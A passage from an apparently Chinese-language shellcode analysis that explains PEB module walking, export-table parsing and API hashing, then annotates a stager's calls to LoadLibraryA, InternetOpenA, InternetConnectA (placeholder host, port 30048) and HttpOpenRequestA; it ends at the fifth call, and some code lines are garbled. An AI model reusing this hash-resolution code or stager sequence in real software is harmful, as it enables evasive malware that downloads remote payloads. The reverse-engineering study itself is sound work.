        return result;
    }
#### 1.1.3判断导出表
接下来的一段，了解PE文件结构的时候，定然一眼看穿，我们已经大概感知到了，找到模块不是目的，找到模块里的函数地址才应该是最终目的。所以首先要判断的是有没有导出表
从上文的汇编代码中已经直到，edx寄存器，保存了`_LDR_DATA_TABLE_ENTRY`其中的0x8位置，其中0x18是DllBase，也就是模块基址。  
模块的0x30位置是PE文件NT头距离DOS头的偏移，距离NT头0x78的位置是可选PE头的数据目录（是一个数组），其中第一个数组的第一个位置是导出表的RVA（也就是距离模块基址的偏移地址），如果为0，那就是没有导出表  
因为我们启动的exe没有导出任何函数，所以这部分为空，我们打断点，跑到下一模块
#### 1.1.4遍历导出表，计算函数哈希
下一个模块就是ntdll.dll，然后进行的内容就是，遍历导出表，计算函数名的哈希  
通过上文找到的偏移地址（RVA）加上模块基址，指向的地址就是下面这样一个结构体，这个结构体是关于导出表的一个描述符，里面最后五个成员尤为重要
    typedef struct _IMAGE_EXPORT_DIRECTORY {
        DWORD   Characteristics;
        DWORD   TimeDateStamp;
        WORD    MajorVersion;
        WORD    MinorVersion;
        DWORD   Name;
        DWORD   Base;
        DWORD   NumberOfFunctions;//函数地址导出的函数数量
        DWORD   NumberOfNames;//函数姓名导出的函数数量
        DWORD   AddressOfFunctions;     // RVA 导出函数地址表
        DWORD   AddressOfNames;         // RVA 导出函数名称表
        DWORD   AddressOfNameOrdinals;  // RVA 导出函数序号表
    } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
其中，`AddressOfFunctions`指向的是一个数组，每个元素是4个字节，保存的是函数的地址偏移（RVA）  
AddressOfNames指向的是一个数组，每个元素4个字节，保存的是函数名称的地址偏移（RVA）  
AddressOfNameOrdinals指向的是一个数组，每个元素2个字节，数组下标的顺序AddressOfNames数组的顺序，对应的值（序号）是在`AddressOfFunctions`中的下标，也就是通过名称找到名称表中的下标，然后在序号表找到对应的序号，通过序号在地址表找到地址
具体情况如图所示：  
不过正常的顺序是找到名字，先计算哈希，然后进行判断，如果判断符合再去找到对应地址表中函数的地址  
哈希的计算方式跟模块计算相差不多，除了不做大小写变形外，就是函数名和模块名的区别，函数名是CHAR，而模块名是WCHAR，所以计算函数名的时候，不存储字符长度，只判断字符串是否到了结尾（最后一位为0）
函数名哈希的计算代码如下：
    DWORD GetFuncHash(PCHAR str)
    {
        DWORD result = 0;
        char * strTemp = str;
        for (int i = 0; i > 0xD) | (result e_lfanew + moduleBase);
        PIMAGE_OPTIONAL_HEADER pOptionHeader = &pNtHeader->OptionalHeader;
        //获取导出表描述符的地址，并判断是否有导出表
        DWORD pExportRva = pOptionHeader->DataDirectory[0].VirtualAddress;
        if (pOptionHeader->DataDirectory[0].VirtualAddress == 0)
        {
            return funcAddr;
        }
        PIMAGE_EXPORT_DIRECTORY pExportTableVa = PIMAGE_EXPORT_DIRECTORY
            (pOptionHeader->DataDirectory[0].VirtualAddress + moduleBase);
        //获取三张导出表
        DWORD * nameTable = (DWORD*)(pExportTableVa->AddressOfNames + moduleBase);
        DWORD * funcTable = (DWORD*)(pExportTableVa->AddressOfFunctions + moduleBase);
        WORD * orderTable = (WORD*)(pExportTableVa->AddressOfNameOrdinals + moduleBase);
        //遍历姓名表，计算哈希，判断是否为目标函数
        for (int i = 0; i NumberOfNames; i++)
        {
            DWORD tempHash = GetFuncHash((PCHAR)(nameTable[i] + moduleBase));
            if (tempHash + modulehash == targetHash)
            {
                funcAddr = funcTable[orderTable[i]] + moduleBase;
                break;
            }
        }
        return funcAddr;
    }
    /*
    *通过hash，获取对应函数的地址
    */
    DWORD GetAddrByHash(DWORD hashCode)
    {
        DWORD target = 0;
        PLIST_ENTRY mmModuleListFirst = NULL;
        //获取链表
        __asm
        {
                mov eax, dword ptr fs : [0]
                mov eax, [eax + 0x30]
                mov eax, [eax + 0xc]
                mov eax, [eax + 0x14]
                mov mmModuleListFirst, eax
        }
        if (mmModuleListFirst == NULL)
        {
            printf("链表获取失败\n");
            return target;
        }
        PLIST_ENTRY mmModuleListNext = mmModuleListFirst->Flink;
        //遍历链表
        while (mmModuleListNext != mmModuleListFirst)
        {
            PLDR_DATA_TABLE_ENTRY pldrTableEntry = (PLDR_DATA_TABLE_ENTRY)((DWORD)mmModuleListNext - 0x8);
            char * buff = (char *)malloc(pldrTableEntry->BaseDllName.MaximumLength);
            memcpy(buff, pldrTableEntry->BaseDllName.Buffer, pldrTableEntry->BaseDllName.MaximumLength);
            //计算模块名的哈希
            DWORD moduleHash = GetModuleHash((PWCHAR)buff, pldrTableEntry->BaseDllName.MaximumLength);
            //计算函数名的哈希，具体函数在上面
            target = GetFuncAddr((DWORD)pldrTableEntry->DllBase, moduleHash, hashCode);
            if (target != 0)
            {
                break;
            }
            mmModuleListNext = mmModuleListNext->Flink;
        }
        return target;
    }
### 1.2调用顺序
了解了这个功能函数，后面的事情似乎会变得更加顺利，因为后面的事情无非就是  
参数 + 特征码 --> 功能函数 --> 获取目标函数 -->调用执行
**第一次调用**
    push 0x74656E
    push 0x696E6977
    push esp
    push 0x726774C
    call ebp
    //执行函数
    HMODULE hWinnet = LoadLibraryA("wininet");
**第二次调用**
    push edi    //edi都为0
    push edi
    push edi
    push edi
    push edi
    push 0xA779563A
    call ebp
    //eax=
    //执行函数
    HINTERNET hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
获取到一个HINTERNET类型的句柄
**第三次调用**
    push ecx  //ecx == 0
    push ecx
    push 0x3    //服务类型，http
    push ecx
    push ecx
    push 0x7561 //端口 16进制
    push ebx    //ebx == 请求连接的域名或ip字符串
    push eax    //eax == 上次调用获取的句柄（第一个参数）
    push C69F8957
    call ebp
    //eax=
    //执行函数
    hInternet = InternetConnectA(hInternet, "x.x.x.x", 30048, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
建立一个internet链接
**第四次调用**
    push edx    //edx == 0
    push 0x84400200
    push edx
    push edx
    push edx
    push ebx    //域名后跟的要访问的文件名
    push edx    
    push eax    //上次调用返回的句柄
    push 3B2E55EB
    call ebp
    //eax=
    //执行函数
    hInternet = HttpOpenRequestA(hInternet, NULL, "/rAED", NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, NULL);
**第五次调用**